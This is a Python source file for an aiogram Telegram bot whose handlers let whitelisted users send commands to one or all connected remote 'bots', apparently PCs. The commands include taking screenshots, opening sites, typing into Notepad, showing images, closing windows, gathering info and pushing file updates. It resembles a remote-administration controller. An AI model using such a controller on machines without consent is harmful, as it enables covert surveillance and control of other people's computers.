from aiogram import Dispatcher, types
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters.state import State, StatesGroup
from aiogram.types import ReplyKeyboardRemove
from create_bot import ids, bot
from Commands import AvailableBots, GetScreenShot, OpenWeb, OpenNotepad, CloseCurrentWindow, OpenImage, GetInfo, Update
from Keyboards import keyboards


# FSM
class StartWorkStates(StatesGroup):
    bot_id = State()
    command = State()


# FSM
class OpenWebStates(StatesGroup):
    website = State()


# FSM
class OpenNotepadStates(StatesGroup):
    text = State()


# FSM
class OpenImageStates(StatesGroup):
    image = State()


# FSM
class LoadUpdateStates(StatesGroup):
    fname = State()
    vcode = State()


# Начало работы с ботом (Ввод bot_id)
async def start_work(message: types.Message):
    if message.from_user.id in ids:
        available_bots = await AvailableBots.get_available_bots()
        if not available_bots['Empty']:
            await bot.send_message(message.from_user.id,
                                   'Вы можете ввести определенный bot_id')
            await bot.send_message(message.from_user.id,
                                   'Или используйте `ALL`', parse_mode='MarkdownV2')
            await bot.send_message(message.from_user.id, 'Для выхода напишите `EXIT`', parse_mode='MarkdownV2')
            await bot.send_message(message.from_user.id, available_bots['bots'], parse_mode='MarkdownV2')
            await StartWorkStates.bot_id.set()
        else:
            await bot.send_message(message.from_user.id, 'Сейчас нет доступных ботов')


# Регистрация следующего шага (Ввод команды и регистрация bot_id)
async def register_bot_id(message: types.Message, state: FSMContext):
    await state.update_data(bot_id=message.text)
    user_data = await state.get_data()

    # Выход
    if user_data["bot_id"] == 'EXIT':
        await bot.send_message(message.from_user.id, 'Вы успешно вышли!')
        await state.finish()
    else:
        await StartWorkStates.next()
        await bot.send_message(message.from_user.id, 'Теперь введите команду',
                               reply_markup=keyboards.commands_keyboard1)
        await bot.send_message(message.from_user.id, 'Или напишите `EXIT` для выхода', parse_mode='MarkdownV2')


# Регистрация следующего шага (Регистрация command и выполнение команды)
async def register_command(message: types.Message, state: FSMContext):
    await state.update_data(command=message.text)
    user_data = await state.get_data()

    # Выход
    if user_data["command"] == "EXIT":
        await bot.send_message(message.from_user.id, 'Вы успешно вышли!')
        await state.finish()

    # Выполнение команды OpenWeb
    elif user_data["command"] == 'OpenWeb':
        await bot.send_message(message.from_user.id,
                               "Выберите сайт по кнопкам или введите свой в формате https://example.com/",
                               reply_markup=keyboards.commands_keyboard2)
        await OpenWebStates.website.set()

    # Выполнение команды OpenNotepad
    elif user_data["command"] == "OpenNotepad":
        await bot.send_message(message.from_user.id, "Введите текст", reply_markup=ReplyKeyboardRemove())
        await OpenNotepadStates.text.set()

    # Выполнение команды CloseCurrentWindow
    elif user_data["command"] == "CloseCurrentWindow":
        await CloseCurrentWindow.close_current_window(user_data, bot, message)
        await state.finish()

    # Выполнение команды GetScreenShot
    elif user_data["command"] == "GetScreenShot":
        await GetScreenShot.get_screenshot(user_data, bot, message)
        await state.finish()

    # Выполнение команды OpenImage
    elif user_data["command"] == 'OpenImage':
        await bot.send_message(message.from_user.id, 'Отправьте мне изображение', reply_markup=ReplyKeyboardRemove())
        await OpenImageStates.image.set()

    # Выполнение команды GetInfo
    elif user_data["command"] == 'GetInfo':
        await state.finish()
        await GetInfo.get_info(user_data, bot, message)


# Выполнение команды LoadUpdate
async def load_update(message: types.Message):
    if message.from_user.id in ids:
        await bot.send_message(message.from_user.id, 'Введите имя файла', reply_markup=ReplyKeyboardRemove())
        await bot.send_message(message.from_user.id, 'Или напишите `EXIT` для выхода', parse_mode='MarkdownV2')
        await LoadUpdateStates.fname.set()


# Регистрируем полученный сайт
async def register_website(message: types.Message, state: FSMContext):
    await state.update_data(website=message.text)
    user_data = await state.get_data()
    await state.finish()
    await OpenWeb.open_web(user_data, bot, message)


# Регистрируем полученный текст
async def register_text(message: types.Message, state: FSMContext):
    await state.update_data(text=message.text)
    user_data = await state.get_data()
    await state.finish()
    await OpenNotepad.open_notepad(user_data, bot, message)


# Регистрируем полученное изображение
async def register_image(message: types.Message, state: FSMContext):
    await state.update_data(image=message.photo[-1].file_id)
    user_data = await state.get_data()
    await state.finish()
    await OpenImage.open_image(user_data, bot, message)


# Регистрируем полученное имя файла для обновления
async def register_update_fname(message: types.Message, state: FSMContext):
    await state.update_data(fname=message.text)
    user_data = await state.get_data()
    if user_data['fname'] == 'EXIT':
        await bot.send_message(message.from_user.id, 'Вы успешно вышли!')
        await state.finish()
    else:
        await bot.send_message(message.from_user.id, 'Теперь пришли кодовое имя')
        await bot.send_message(message.from_user.id, 'Или напишите `EXIT` для выхода', parse_mode='MarkdownV2')
        await LoadUpdateStates.next()


# Регистрируем полученное кодовое имя для обновления
async def register_update_vcode(message: types.Message, state: FSMContext):
    await state.update_data(vcode=message.text)
    user_data = await state.get_data()
    if user_data['vcode'] == 'EXIT':
        await bot.send_message(message.from_user.id, 'Вы успешно вышли!')
        await state.finish()
    else:
        await state.finish()
        await Update.update(user_data, bot, message)


def register_commands_handler(dp: Dispatcher):
    dp.register_message_handler(start_work, commands=['start_work'])
    dp.register_message_handler(load_update, commands=['load_update'])
    dp.register_message_handler(register_bot_id, state=StartWorkStates.bot_id)
    dp.register_message_handler(register_command, state=StartWorkStates.command)
    dp.register_message_handler(register_website, state=OpenWebStates.website)
    dp.register_message_handler(register_text, state=OpenNotepadStates.text)
    dp.register_message_handler(register_image, content_types=['photo'], state=OpenImageStates.image)
    dp.register_message_handler(register_update_fname, state=LoadUpdateStates.fname)
    dp.register_message_handler(register_update_vcode, state=LoadUpdateStates.vcode)
